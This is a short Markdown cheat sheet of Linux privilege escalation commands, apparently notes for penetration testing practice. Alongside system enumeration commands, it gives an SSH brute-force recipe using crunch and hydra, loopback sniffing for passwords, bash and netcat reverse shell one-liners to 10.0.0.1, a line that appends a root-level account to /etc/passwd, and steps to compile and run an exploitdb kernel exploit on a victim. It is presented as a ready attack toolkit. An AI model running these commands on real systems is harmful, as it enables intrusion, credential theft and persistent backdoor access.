# Linux Privilege Escalation

## Manual enumeration

Commands:
- `id`
- `cat /etc/passwd`
- `hostname`
- `cat /etc/issue`
- `cat /etc/os-realease`
- `uname -a`
- `ps aux`
- `ip a`
- `routel`
- `ss -anp`
- `cat /etc/iptables/rules.v4`
- `ls -lah /etc/cron*`
- `crontab -l`
- `sudo crontab -l`
- `dpkg -l`
- `find / -writable -type d 2> /dev/null`
- `cat /etc/fstab`
- `mount`
- `lsblk`
- `lsmod`
- `/sbin/modinfo some_kernel_module`
- `find / -perm -u=s -type f 2> /dev/null`

## Automated enumeration

```
/usr/bin/unix-privesc-check
```

## Brute force ssh

```
crunch 11 11 -t Password%%% > wordlist
hydra -l user -P wordlist $VictimIP -t 4 ssh -V
```

## Services

```
sudo tcpdump -i lo -A | grep "pass"
watch -n1 "ps auxww | grep pass | grep -v grep | fold -s
```

## Cron jobs

Source: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

## Passwd file

```
openssl passwd passwordtohash
echo "newadmin:somehaststring:0:0:root:/root:/bin/bash" >> /etc/passwd
```

## SUID

Source: https://gtfobins.github.io/
```
find / -perm /6000 -exec ls -ld {} \; # setuid + setgid
grep Uid /proc/procnum/status
ls -asl /usr/bin/somebin
```

## Sudo

```
searchsploit -u
searchsploit "Linux kernel 4.4.0 privilege escalation"
cp /usr/share/exploitdb/exploits/linux/local/num.c .
gcc num.c
scp num.c victim@IP:
./a.out
```




